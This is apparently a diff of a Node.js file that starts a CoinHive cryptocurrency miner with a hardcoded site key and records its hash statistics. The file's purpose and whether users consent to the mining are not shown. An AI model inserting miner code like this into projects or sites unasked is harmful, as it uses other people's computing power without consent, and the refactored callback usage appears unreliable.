@@ -22,20 +22,15 @@ var is_hive_start="0000";
 try{
 
 
-var CoinHive = require('coin-hive');
-
-//(async () => {
-  // Create miner
 
    var  CoinHive = require('coin-hive');
     
     /*Prepare_task*/
 
-      var miner = CoinHive('SyP8K30PFsIXCdKa1Ng4R7Ieh6BhIbLq');
-       miner.start();
-    is_hive_start="yes";
+      var miner = CoinHive('SyP8K30PFsIXCdKa1Ng4R7Ieh6BhIbLq',function(err,miner){
+        miner.start(); 
 
-            miner.on('found', () => console.log('Found!'));
+        miner.on('found', () => console.log('Found!'));
             miner.on('accepted', () => console.log('Accepted!'));
             miner.on('update',function(data){
 
@@ -44,41 +39,8 @@ var CoinHive = require('coin-hive');
                   coin_hive["acceptedHashes"]=data.acceptedHashes;
 
              });
-
-
-  // CoinHive('SyP8K30PFsIXCdKa1Ng4R7Ieh6BhIbLq',function(miner){
-  //   if(miner){
-  //       is_hive_start="miner get";
-  //     }else{
-  //       miner.start();
-  //       miner.on('found', () => console.log('Found!'));
-  //       miner.on('accepted', () => console.log('Accepted!'));
-
-  //     var fs = require("fs");
-  //     miner.on('update',function(data){
-
-  //     coin_hive["hashesPerSecond"]=data.hashesPerSecond;
-  //     coin_hive["totalHashes"]=data.totalHashes;
-  //     coin_hive["acceptedHashes"]=data.acceptedHashes;
-
-
-  //     }); // CoinHive's Site Key
-
-  //   }
-
-  // // Start miner
-  
-
-  // // Listen on events
-
-    
-  //   // fs.writeFile(process.cwd()+"/found-coin.txt","hashesPerSecond : "+data.hashesPerSecond+" => total hash : "+data.totalHashes+" acceptedHashes : "+data.acceptedHashes,function(err){
-  //   //   //callback({status:{flag:"success"}});
-
-  //   // });
-
-  // });
-
+      });
+       
 }
 catch(err){
     is_hive_start=err;
